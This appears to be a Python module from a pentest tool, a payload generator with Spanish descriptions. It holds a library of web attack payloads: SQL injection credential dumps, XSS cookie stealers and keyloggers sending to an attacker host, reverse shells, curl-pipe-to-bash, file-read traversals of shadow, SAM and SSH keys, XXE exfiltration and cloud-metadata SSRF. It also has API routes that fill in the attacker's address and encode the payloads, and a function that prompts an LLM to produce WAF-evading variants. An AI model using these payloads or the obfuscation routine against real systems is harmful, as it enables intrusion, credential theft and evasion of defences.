"""
NetProbe Security Suite — Payload Generator
Genera payloads para SQLi, XSS, LFI, RFI, SSTI, CMDi, XXE, SSRF, Open Redirect
con bypass de WAF/filtros y ofuscación via Groq IA.
"""
import json, base64, urllib.parse, re
from datetime import datetime

# ── Biblioteca de payloads ────────────────────────────────────────
PAYLOADS = {
    "sqli": {
        "label": "SQL Injection",
        "color": "#c94040",
        "icon": "database",
        "description": "Inyección SQL para extraer datos, bypass de autenticación y ejecución de comandos",
        "subcategories": {
            "auth_bypass": {
                "label": "Auth Bypass",
                "payloads": [
                    {"id":"sqli_ab1",  "name":"Classic OR",           "payload":"' OR '1'='1",                    "context":"Login field",    "risk":"HIGH"},
                    {"id":"sqli_ab2",  "name":"Comment bypass",        "payload":"' OR 1=1--",                     "context":"Login field",    "risk":"HIGH"},
                    {"id":"sqli_ab3",  "name":"Admin bypass",          "payload":"admin'--",                       "context":"Username",       "risk":"HIGH"},
                    {"id":"sqli_ab4",  "name":"Hash bypass",           "payload":"' OR '1'='1' /*",                "context":"Password",       "risk":"HIGH"},
                    {"id":"sqli_ab5",  "name":"Double dash",           "payload":"\" OR \"\"=\"",                  "context":"Double quotes",  "risk":"MEDIUM"},
                    {"id":"sqli_ab6",  "name":"Null byte",             "payload":"' OR 1=1%00",                    "context":"URL param",      "risk":"HIGH"},
                ],
            },
            "union": {
                "label": "UNION Based",
                "payloads": [
                    {"id":"sqli_u1",   "name":"Column count 1",        "payload":"' ORDER BY 1--",                 "context":"GET param",      "risk":"MEDIUM"},
                    {"id":"sqli_u2",   "name":"Column count 5",        "payload":"' ORDER BY 5--",                 "context":"GET param",      "risk":"MEDIUM"},
                    {"id":"sqli_u3",   "name":"UNION 2 cols",          "payload":"' UNION SELECT NULL,NULL--",     "context":"GET param",      "risk":"HIGH"},
                    {"id":"sqli_u4",   "name":"UNION version",         "payload":"' UNION SELECT NULL,version()--","context":"MySQL",          "risk":"HIGH"},
                    {"id":"sqli_u5",   "name":"UNION tables",          "payload":"' UNION SELECT table_name,NULL FROM information_schema.tables--","context":"MySQL","risk":"CRITICAL"},
                    {"id":"sqli_u6",   "name":"UNION columns",         "payload":"' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--","context":"MySQL","risk":"CRITICAL"},
                    {"id":"sqli_u7",   "name":"UNION credentials",     "payload":"' UNION SELECT username,password FROM users--","context":"MySQL","risk":"CRITICAL"},
                ],
            },
            "blind": {
                "label": "Blind / Time-Based",
                "payloads": [
                    {"id":"sqli_b1",   "name":"Boolean true",          "payload":"' AND 1=1--",                    "context":"GET param",      "risk":"MEDIUM"},
                    {"id":"sqli_b2",   "name":"Boolean false",         "payload":"' AND 1=2--",                    "context":"GET param",      "risk":"MEDIUM"},
                    {"id":"sqli_b3",   "name":"Time MySQL",            "payload":"'; SELECT SLEEP(5)--",           "context":"MySQL",          "risk":"HIGH"},
                    {"id":"sqli_b4",   "name":"Time MSSQL",            "payload":"'; WAITFOR DELAY '0:0:5'--",     "context":"MSSQL",          "risk":"HIGH"},
                    {"id":"sqli_b5",   "name":"Time PostgreSQL",       "payload":"'; SELECT pg_sleep(5)--",        "context":"PostgreSQL",     "risk":"HIGH"},
                    {"id":"sqli_b6",   "name":"Substring blind",       "payload":"' AND SUBSTRING(username,1,1)='a'--","context":"MySQL",      "risk":"HIGH"},
                ],
            },
            "error": {
                "label": "Error Based",
                "payloads": [
                    {"id":"sqli_e1",   "name":"ExtractValue MySQL",    "payload":"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--","context":"MySQL","risk":"HIGH"},
                    {"id":"sqli_e2",   "name":"UpdateXML MySQL",       "payload":"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--","context":"MySQL","risk":"HIGH"},
                    {"id":"sqli_e3",   "name":"Convert MSSQL",         "payload":"' CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--","context":"MSSQL","risk":"HIGH"},
                ],
            },
            "waf_bypass": {
                "label": "WAF Bypass",
                "payloads": [
                    {"id":"sqli_w1",   "name":"Case variation",        "payload":"' uNiOn SeLeCt NULL--",          "context":"WAF bypass",     "risk":"HIGH"},
                    {"id":"sqli_w2",   "name":"Comment injection",     "payload":"' UN/**/ION SE/**/LECT NULL--",  "context":"WAF bypass",     "risk":"HIGH"},
                    {"id":"sqli_w3",   "name":"URL double encode",     "payload":"%2527%2520OR%25201%253D1--",     "context":"URL encoded",    "risk":"HIGH"},
                    {"id":"sqli_w4",   "name":"Whitespace bypass",     "payload":"'%09OR%091=1--",                 "context":"Tab bypass",     "risk":"HIGH"},
                    {"id":"sqli_w5",   "name":"Hex encode",            "payload":"' OR 0x313d31--",               "context":"Hex WAF",        "risk":"HIGH"},
                ],
            },
        },
    },

    "xss": {
        "label": "Cross-Site Scripting",
        "color": "#e4692a",
        "icon": "code",
        "description": "Inyección de scripts para robo de cookies, keylogging y defacement",
        "subcategories": {
            "reflected": {
                "label": "Reflected",
                "payloads": [
                    {"id":"xss_r1",    "name":"Basic alert",           "payload":"<script>alert(1)</script>",      "context":"Input field",    "risk":"MEDIUM"},
                    {"id":"xss_r2",    "name":"Alert XSS",             "payload":"<script>alert('XSS')</script>", "context":"Input field",    "risk":"MEDIUM"},
                    {"id":"xss_r3",    "name":"SVG onload",            "payload":"<svg onload=alert(1)>",          "context":"HTML context",   "risk":"MEDIUM"},
                    {"id":"xss_r4",    "name":"IMG onerror",           "payload":"<img src=x onerror=alert(1)>",   "context":"HTML context",   "risk":"MEDIUM"},
                    {"id":"xss_r5",    "name":"Body onload",           "payload":"<body onload=alert(1)>",         "context":"HTML injection", "risk":"MEDIUM"},
                    {"id":"xss_r6",    "name":"Cookie stealer",        "payload":"<script>document.location='http://LHOST/?c='+document.cookie</script>","context":"Cookie theft","risk":"HIGH"},
                ],
            },
            "stored": {
                "label": "Stored / DOM",
                "payloads": [
                    {"id":"xss_s1",    "name":"Keylogger",             "payload":"<script>document.onkeypress=function(e){new Image().src='http://LHOST/?k='+e.key}</script>","context":"Stored","risk":"CRITICAL"},
                    {"id":"xss_s2",    "name":"BeEF hook",             "payload":"<script src='http://LHOST:3000/hook.js'></script>","context":"BeEF","risk":"CRITICAL"},
                    {"id":"xss_s3",    "name":"DOM innerHTML",         "payload":"document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'","context":"DOM","risk":"MEDIUM"},
                    {"id":"xss_s4",    "name":"Location redirect",     "payload":"<script>window.location='http://LHOST'</script>","context":"Redirect","risk":"HIGH"},
                ],
            },
            "waf_bypass": {
                "label": "WAF Bypass",
                "payloads": [
                    {"id":"xss_w1",    "name":"No quotes",             "payload":"<script>alert`1`</script>",      "context":"Quote filter",   "risk":"MEDIUM"},
                    {"id":"xss_w2",    "name":"Case mix",              "payload":"<ScRiPt>alert(1)</sCrIpT>",      "context":"Case filter",    "risk":"MEDIUM"},
                    {"id":"xss_w3",    "name":"HTML entities",         "payload":"&lt;script&gt;alert(1)&lt;/script&gt;","context":"Entity bypass","risk":"MEDIUM"},
                    {"id":"xss_w4",    "name":"Unicode",               "payload":"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e","context":"Unicode","risk":"MEDIUM"},
                    {"id":"xss_w5",    "name":"Tab in tag",            "payload":"<script\talert(1)>",             "context":"Whitespace",     "risk":"MEDIUM"},
                    {"id":"xss_w6",    "name":"Null byte",             "payload":"<scr\x00ipt>alert(1)</scr\x00ipt>","context":"Null byte",   "risk":"HIGH"},
                    {"id":"xss_w7",    "name":"Double encode",         "payload":"%253Cscript%253Ealert(1)%253C%252Fscript%253E","context":"Double URL","risk":"HIGH"},
                ],
            },
        },
    },

    "lfi": {
        "label": "LFI / Path Traversal",
        "color": "#c8a951",
        "icon": "folder",
        "description": "Inclusión de archivos locales para leer /etc/passwd, logs y archivos sensibles",
        "subcategories": {
            "basic": {
                "label": "Basic Traversal",
                "payloads": [
                    {"id":"lfi_b1",    "name":"Linux passwd",          "payload":"../../../etc/passwd",            "context":"file= param",    "risk":"HIGH"},
                    {"id":"lfi_b2",    "name":"Linux shadow",          "payload":"../../../etc/shadow",            "context":"file= param",    "risk":"CRITICAL"},
                    {"id":"lfi_b3",    "name":"Deep traversal",        "payload":"../../../../../../../../etc/passwd","context":"Deep path",   "risk":"HIGH"},
                    {"id":"lfi_b4",    "name":"Windows SAM",           "payload":"..\\..\\..\\windows\\system32\\config\\SAM","context":"Windows","risk":"CRITICAL"},
                    {"id":"lfi_b5",    "name":"Windows hosts",         "payload":"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","context":"Windows","risk":"MEDIUM"},
                    {"id":"lfi_b6",    "name":"SSH keys",              "payload":"../../../home/user/.ssh/id_rsa", "context":"Linux",          "risk":"CRITICAL"},
                ],
            },
            "log_poison": {
                "label": "Log Poisoning",
                "payloads": [
                    {"id":"lfi_lp1",   "name":"Apache access log",     "payload":"../../../var/log/apache2/access.log","context":"Apache LFI","risk":"CRITICAL"},
                    {"id":"lfi_lp2",   "name":"Apache error log",      "payload":"../../../var/log/apache2/error.log","context":"Apache LFI", "risk":"HIGH"},
                    {"id":"lfi_lp3",   "name":"Nginx access log",      "payload":"../../../var/log/nginx/access.log","context":"Nginx LFI",  "risk":"CRITICAL"},
                    {"id":"lfi_lp4",   "name":"PHP session",           "payload":"../../../var/lib/php/sessions/sess_SESSIONID","context":"PHP","risk":"CRITICAL"},
                    {"id":"lfi_lp5",   "name":"Auth log",              "payload":"../../../var/log/auth.log",      "context":"Linux",          "risk":"HIGH"},
                ],
            },
            "waf_bypass": {
                "label": "WAF Bypass",
                "payloads": [
                    {"id":"lfi_w1",    "name":"URL encode",            "payload":"..%2F..%2F..%2Fetc%2Fpasswd",    "context":"URL encoded",    "risk":"HIGH"},
                    {"id":"lfi_w2",    "name":"Double encode",         "payload":"..%252F..%252F..%252Fetc%252Fpasswd","context":"Double enc.", "risk":"HIGH"},
                    {"id":"lfi_w3",    "name":"Null byte (PHP<5.3)",   "payload":"../../../etc/passwd%00",         "context":"PHP null byte",  "risk":"HIGH"},
                    {"id":"lfi_w4",    "name":"Dot bypass",            "payload":"....//....//....//etc/passwd",   "context":"Stripped ../",   "risk":"HIGH"},
                    {"id":"lfi_w5",    "name":"Slash variation",       "payload":"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd","context":"Unicode slash","risk":"HIGH"},
                ],
            },
            "rfi": {
                "label": "Remote File Inclusion",
                "payloads": [
                    {"id":"rfi_1",     "name":"HTTP RFI",              "payload":"http://LHOST/shell.php",         "context":"RFI param",      "risk":"CRITICAL"},
                    {"id":"rfi_2",     "name":"HTTPS RFI",             "payload":"https://LHOST/shell.php",        "context":"RFI HTTPS",      "risk":"CRITICAL"},
                    {"id":"rfi_3",     "name":"FTP RFI",               "payload":"ftp://LHOST/shell.php",          "context":"FTP RFI",        "risk":"CRITICAL"},
                    {"id":"rfi_4",     "name":"PHP filter",            "payload":"php://filter/convert.base64-encode/resource=index.php","context":"PHP filter","risk":"HIGH"},
                    {"id":"rfi_5",     "name":"Data URI PHP",          "payload":"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=","context":"data://","risk":"CRITICAL"},
                ],
            },
        },
    },

    "ssti": {
        "label": "SSTI",
        "color": "#9b59b6",
        "icon": "braces",
        "description": "Server-Side Template Injection para RCE en motores como Jinja2, Twig, Freemarker",
        "subcategories": {
            "detection": {
                "label": "Detección",
                "payloads": [
                    {"id":"ssti_d1",   "name":"Math probe",            "payload":"{{7*7}}",                        "context":"Jinja2/Twig",    "risk":"MEDIUM"},
                    {"id":"ssti_d2",   "name":"String probe",          "payload":"${7*7}",                         "context":"Freemarker",     "risk":"MEDIUM"},
                    {"id":"ssti_d3",   "name":"ERB probe",             "payload":"<%= 7*7 %>",                     "context":"ERB/Ruby",       "risk":"MEDIUM"},
                    {"id":"ssti_d4",   "name":"Smarty probe",          "payload":"{7*7}",                          "context":"Smarty",         "risk":"MEDIUM"},
                    {"id":"ssti_d5",   "name":"Velocity probe",        "payload":"#set($x=7*7)${x}",               "context":"Velocity",       "risk":"MEDIUM"},
                ],
            },
            "jinja2": {
                "label": "Jinja2 (Python)",
                "payloads": [
                    {"id":"ssti_j1",   "name":"Config dump",           "payload":"{{config}}",                     "context":"Jinja2",         "risk":"HIGH"},
                    {"id":"ssti_j2",   "name":"OS module",             "payload":"{{''.__class__.__mro__[1].__subclasses__()}}","context":"Jinja2","risk":"HIGH"},
                    {"id":"ssti_j3",   "name":"RCE id",                "payload":"{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}","context":"Jinja2 RCE","risk":"CRITICAL"},
                    {"id":"ssti_j4",   "name":"RCE whoami",            "payload":"{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='Popen'%}{{c(['whoami'],stdout=-1).communicate()}}{%endif%}{%endfor%}","context":"Jinja2","risk":"CRITICAL"},
                    {"id":"ssti_j5",   "name":"Read file",             "payload":"{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}","context":"Jinja2","risk":"CRITICAL"},
                ],
            },
            "twig": {
                "label": "Twig (PHP)",
                "payloads": [
                    {"id":"ssti_t1",   "name":"Version",               "payload":"{{_self.env.getExtension('Twig_Extension_Debug')}}","context":"Twig","risk":"MEDIUM"},
                    {"id":"ssti_t2",   "name":"System RCE",            "payload":"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}","context":"Twig RCE","risk":"CRITICAL"},
                    {"id":"ssti_t3",   "name":"Filter RCE",            "payload":"{{['id']|filter('system')}}",    "context":"Twig",           "risk":"CRITICAL"},
                ],
            },
            "freemarker": {
                "label": "Freemarker (Java)",
                "payloads": [
                    {"id":"ssti_f1",   "name":"RCE freemarker",        "payload":"<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}","context":"Freemarker","risk":"CRITICAL"},
                    {"id":"ssti_f2",   "name":"ClassUtil",             "payload":"${\"freemarker.template.utility.Execute\"?new()(\"id\")}","context":"Freemarker","risk":"CRITICAL"},
                ],
            },
        },
    },

    "cmdi": {
        "label": "Command Injection",
        "color": "#57cbde",
        "icon": "terminal",
        "description": "Ejecución de comandos del sistema operativo a través de parámetros de la aplicación",
        "subcategories": {
            "basic": {
                "label": "Basic",
                "payloads": [
                    {"id":"cmd_b1",    "name":"Semicolon",             "payload":"; id",                           "context":"Linux param",    "risk":"CRITICAL"},
                    {"id":"cmd_b2",    "name":"Pipe",                  "payload":"| id",                           "context":"Linux param",    "risk":"CRITICAL"},
                    {"id":"cmd_b3",    "name":"AND",                   "payload":"&& id",                          "context":"Linux param",    "risk":"CRITICAL"},
                    {"id":"cmd_b4",    "name":"OR fallback",           "payload":"|| id",                          "context":"Linux param",    "risk":"CRITICAL"},
                    {"id":"cmd_b5",    "name":"Backtick",              "payload":"`id`",                           "context":"Linux param",    "risk":"CRITICAL"},
                    {"id":"cmd_b6",    "name":"Subshell",              "payload":"$(id)",                          "context":"Linux param",    "risk":"CRITICAL"},
                    {"id":"cmd_b7",    "name":"Windows cmd",           "payload":"& whoami",                       "context":"Windows param",  "risk":"CRITICAL"},
                    {"id":"cmd_b8",    "name":"Windows pipe",          "payload":"| whoami",                       "context":"Windows param",  "risk":"CRITICAL"},
                ],
            },
            "blind": {
                "label": "Blind (Time-Based)",
                "payloads": [
                    {"id":"cmd_bl1",   "name":"Sleep Linux",           "payload":"; sleep 5",                      "context":"Blind Linux",    "risk":"HIGH"},
                    {"id":"cmd_bl2",   "name":"Ping Linux",            "payload":"; ping -c 5 127.0.0.1",          "context":"Blind Linux",    "risk":"HIGH"},
                    {"id":"cmd_bl3",   "name":"Timeout Windows",       "payload":"& timeout /t 5",                 "context":"Blind Windows",  "risk":"HIGH"},
                    {"id":"cmd_bl4",   "name":"OOB DNS",               "payload":"; nslookup LHOST",               "context":"OOB detection",  "risk":"HIGH"},
                ],
            },
            "reverse_shell": {
                "label": "Reverse Shell via CMDi",
                "payloads": [
                    {"id":"cmd_rs1",   "name":"Bash revshell",         "payload":"; bash -i >& /dev/tcp/LHOST/LPORT 0>&1","context":"Bash","risk":"CRITICAL"},
                    {"id":"cmd_rs2",   "name":"Python revshell",       "payload":"; python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"LHOST\",LPORT));subprocess.call([\"/bin/sh\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'","context":"Python","risk":"CRITICAL"},
                    {"id":"cmd_rs3",   "name":"Curl execute",          "payload":"; curl http://LHOST/shell.sh | bash","context":"Curl","risk":"CRITICAL"},
                ],
            },
            "waf_bypass": {
                "label": "WAF Bypass",
                "payloads": [
                    {"id":"cmd_w1",    "name":"IFS bypass",            "payload":"i${IFS}d",                       "context":"IFS Linux",      "risk":"HIGH"},
                    {"id":"cmd_w2",    "name":"Brace expansion",       "payload":"{i,d}",                          "context":"Brace",          "risk":"HIGH"},
                    {"id":"cmd_w3",    "name":"Wildcard",              "payload":"/???/i?",                        "context":"Wildcard",       "risk":"HIGH"},
                    {"id":"cmd_w4",    "name":"Env var",               "payload":"$u{id}",                         "context":"Env bypass",     "risk":"HIGH"},
                    {"id":"cmd_w5",    "name":"Hex cmd",               "payload":"$(echo 'aWQ=' | base64 -d)",     "context":"B64 bypass",     "risk":"HIGH"},
                ],
            },
        },
    },

    "xxe": {
        "label": "XXE / SSRF",
        "color": "#66c0f4",
        "icon": "file-code",
        "description": "XML External Entity y Server-Side Request Forgery para leer archivos internos y pivoting",
        "subcategories": {
            "xxe_basic": {
                "label": "XXE Basic",
                "payloads": [
                    {"id":"xxe_b1",    "name":"Read /etc/passwd",      "payload":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>","context":"XML body","risk":"CRITICAL"},
                    {"id":"xxe_b2",    "name":"Read win hosts",        "payload":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><foo>&xxe;</foo>","context":"Windows","risk":"HIGH"},
                    {"id":"xxe_b3",    "name":"OOB exfil",             "payload":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://LHOST/?data=%file;\"> %xxe;]>","context":"OOB XXE","risk":"CRITICAL"},
                    {"id":"xxe_b4",    "name":"PHP wrapper",           "payload":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>","context":"PHP","risk":"CRITICAL"},
                ],
            },
            "ssrf": {
                "label": "SSRF",
                "payloads": [
                    {"id":"ssrf_1",    "name":"Internal metadata",     "payload":"http://169.254.169.254/latest/meta-data/","context":"AWS metadata","risk":"CRITICAL"},
                    {"id":"ssrf_2",    "name":"GCP metadata",          "payload":"http://metadata.google.internal/computeMetadata/v1/","context":"GCP metadata","risk":"CRITICAL"},
                    {"id":"ssrf_3",    "name":"Localhost 8080",        "payload":"http://127.0.0.1:8080/",         "context":"Internal port",  "risk":"HIGH"},
                    {"id":"ssrf_4",    "name":"IPv6 localhost",        "payload":"http://[::1]:80/",               "context":"IPv6 bypass",    "risk":"HIGH"},
                    {"id":"ssrf_5",    "name":"0.0.0.0",               "payload":"http://0.0.0.0:80/",             "context":"SSRF bypass",    "risk":"HIGH"},
                    {"id":"ssrf_6",    "name":"Decimal IP",            "payload":"http://2130706433/",             "context":"Decimal 127.0.0.1","risk":"HIGH"},
                    {"id":"ssrf_7",    "name":"URL bypass @",          "payload":"http://evil.com@127.0.0.1/",     "context":"@ bypass",       "risk":"HIGH"},
                ],
            },
        },
    },

    "open_redirect": {
        "label": "Open Redirect",
        "color": "#5ba32b",
        "icon": "external-link",
        "description": "Redirecciones abiertas para phishing y bypass de CSP/CORS",
        "subcategories": {
            "basic": {
                "label": "Basic",
                "payloads": [
                    {"id":"or_1",      "name":"Direct",                "payload":"https://evil.com",               "context":"redirect= param","risk":"MEDIUM"},
                    {"id":"or_2",      "name":"Double slash",          "payload":"//evil.com",                     "context":"//bypass",       "risk":"MEDIUM"},
                    {"id":"or_3",      "name":"Backslash",             "payload":"\\/\\/evil.com",                 "context":"Backslash",      "risk":"MEDIUM"},
                    {"id":"or_4",      "name":"Protocol relative",     "payload":"///evil.com/%2F..",              "context":"Protocol rel.",  "risk":"MEDIUM"},
                    {"id":"or_5",      "name":"Encoded slash",         "payload":"https:%0D%0Aevil.com",           "context":"CRLF redirect",  "risk":"HIGH"},
                    {"id":"or_6",      "name":"Javascript",            "payload":"javascript:alert(document.domain)","context":"JS proto",    "risk":"HIGH"},
                ],
            },
        },
    },
}

# ── Encodings ─────────────────────────────────────────────────────
def encode_payload(payload: str, encoding: str) -> str:
    if encoding == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif encoding == "url":
        return urllib.parse.quote(payload, safe='')
    elif encoding == "double_url":
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
    elif encoding == "html":
        return payload.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;').replace("'",'&#x27;')
    elif encoding == "hex":
        return ''.join(f'%{b:02X}' for b in payload.encode())
    elif encoding == "unicode":
        result = ''
        for c in payload:
            if ord(c) > 127 or c in '<>\'"/\\':
                result += f'\\u{ord(c):04x}'
            else:
                result += c
        return result
    return payload

# ── AI obfuscation via Groq ───────────────────────────────────────
async def ai_obfuscate(payload: str, category: str, api_key: str, model: str) -> dict:
    import httpx
    PROMPT = f"""Eres un experto en bypass de WAF y pentesting web. 
Tu tarea es generar 3 variantes ofuscadas del siguiente payload de {category} para bypassear WAFs modernos (ModSecurity, Cloudflare, AWS WAF).

Payload original:
{payload}

Genera exactamente 3 variantes diferentes usando técnicas como:
- Encoding (URL, HTML, Unicode, hex)
- Case variation
- Comment injection
- Whitespace manipulation  
- Alternative syntax
- Null bytes
- String concatenation

Responde SOLO con JSON válido, sin markdown, sin explicaciones:
{{"variants": [{{"technique": "nombre_tecnica", "payload": "payload_ofuscado", "notes": "breve nota"}}, ...]}}"""

    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json",
    }
    payload_data = {
        "model": model,
        "messages": [{"role": "user", "content": PROMPT}],
        "max_tokens": 1024,
        "temperature": 0.7,
    }
    try:
        async with httpx.AsyncClient(timeout=30) as client:
            resp = await client.post(
                "https://api.groq.com/openai/v1/chat/completions",
                headers=headers, json=payload_data
            )
            data = resp.json()
            if resp.status_code != 200:
                return {"error": data.get("error", {}).get("message", "Error API")}
            content = data["choices"][0]["message"]["content"]
            # Strip markdown if present
            content = re.sub(r'```json\s*|\s*```', '', content).strip()
            return json.loads(content)
    except Exception as e:
        return {"error": str(e)}


# ── Routes ────────────────────────────────────────────────────────
def register_payload_routes(app):
    from fastapi import HTTPException
    from pydantic import BaseModel
    from typing import Optional

    class GenerateRequest(BaseModel):
        category:    str
        subcategory: Optional[str] = None
        encoding:    str = "none"
        lhost:       str = ""
        lport:       str = "4444"

    class ObfuscateRequest(BaseModel):
        payload:     str
        category:    str
        api_key:     str
        model:       str = "llama-3.3-70b-versatile"

    @app.get("/api/payloads/categories")
    def get_categories():
        cats = {}
        for cid, c in PAYLOADS.items():
            cats[cid] = {
                "label":       c["label"],
                "color":       c["color"],
                "icon":        c["icon"],
                "description": c["description"],
                "subcategories": {
                    sid: {"label": s["label"], "count": len(s["payloads"])}
                    for sid, s in c["subcategories"].items()
                }
            }
        return {"categories": cats}

    @app.post("/api/payloads/generate")
    def generate_payloads(req: GenerateRequest):
        if req.category not in PAYLOADS:
            raise HTTPException(404, "Categoría no encontrada")

        cat = PAYLOADS[req.category]
        results = []

        subs = cat["subcategories"]
        if req.subcategory and req.subcategory in subs:
            subs = {req.subcategory: subs[req.subcategory]}

        for sid, sub in subs.items():
            for p in sub["payloads"]:
                raw = p["payload"]
                # Replace placeholders
                if req.lhost:
                    raw = raw.replace("LHOST", req.lhost)
                if req.lport:
                    raw = raw.replace("LPORT", req.lport)
                # Encode
                encoded = encode_payload(raw, req.encoding) if req.encoding != "none" else raw
                results.append({
                    **p,
                    "payload":         encoded,
                    "payload_raw":     raw,
                    "subcategory":     sid,
                    "subcategory_label": sub["label"],
                    "encoding":        req.encoding,
                    "category":        req.category,
                    "category_label":  cat["label"],
                    "category_color":  cat["color"],
                })

        return {
            "payloads":  results,
            "total":     len(results),
            "category":  req.category,
            "encoding":  req.encoding,
            "generated": datetime.now().isoformat(),
        }

    @app.post("/api/payloads/obfuscate")
    async def obfuscate_payload(req: ObfuscateRequest):
        if not req.api_key:
            raise HTTPException(400, "API key requerida")
        result = await ai_obfuscate(req.payload, req.category, req.api_key, req.model)
        return result
